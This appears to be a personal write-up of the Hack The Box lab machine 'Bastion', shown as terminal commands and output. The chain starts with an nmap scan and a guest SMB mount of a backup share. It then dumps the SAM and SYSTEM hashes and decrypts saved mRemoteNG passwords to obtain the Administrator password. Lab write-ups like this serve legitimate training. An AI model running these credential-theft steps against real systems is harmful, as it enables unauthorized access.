# nmap 

```shell
tarting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-19 09:31 CDT
Nmap scan report for 10.129.11.5
Host is up (0.0015s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-09-19T16:31:20+02:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -39m58s, deviation: 1h09m14s, median: 0s
| smb2-time: 
|   date: 2024-09-19T14:31:18
|_  start_date: 2024-09-19T14:13:32

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.38 seconds

```

# Found username on the machine //IP/Backups 

 > L4mpje-PC   
 
# mounted the share using mount [resource](https://cyberthoth.medium.com/mounting-vhd-files-in-kali-linux-through-remote-share-smb-1c4d37c22211)

```shell
sudo mount -t cifs \\IP\Share -o user=guest,password= <local_dir>
```
 
 
> has a vhd file that, get SAM and SYSTEM files from C:\\Windows\System32\Config\SAM C:\\Windows\System32\Config\SYSTEM, I looked at a walkthrough to proceed with this 

```shell
samdump SYSTEM SAM
```

l4mpje:bureaulampje

# found an application mRemoteNG, which enables remote connection 

> Get the config file which contains credentials from 

```shell
Users\L4mpje\AppData\Roaming\mRemoteNG/confCons.xml
```

>I downloaded the file from the windows machine using scp

```shell
scp l4mpje@10.129.11.5:/Users/L4mpje/AppData/Roaming/mRemoteNG/confCons.xml .

```


> Then I used a python script that decrypts mRemoteNG's config file
> [resource](https://github.com/gquere/mRemoteNG_password_decrypt) 

```shell
python3 mremoteng_decrypt.py confCons.xml 

```

> got admin password 

```
Name: DC
Hostname: 127.0.0.1
Username: Administrator
Password: thXLHM96BeKL0ER2

Name: L4mpje-PC
Hostname: 192.168.1.75
Username: L4mpje
Password: bureaulampje

```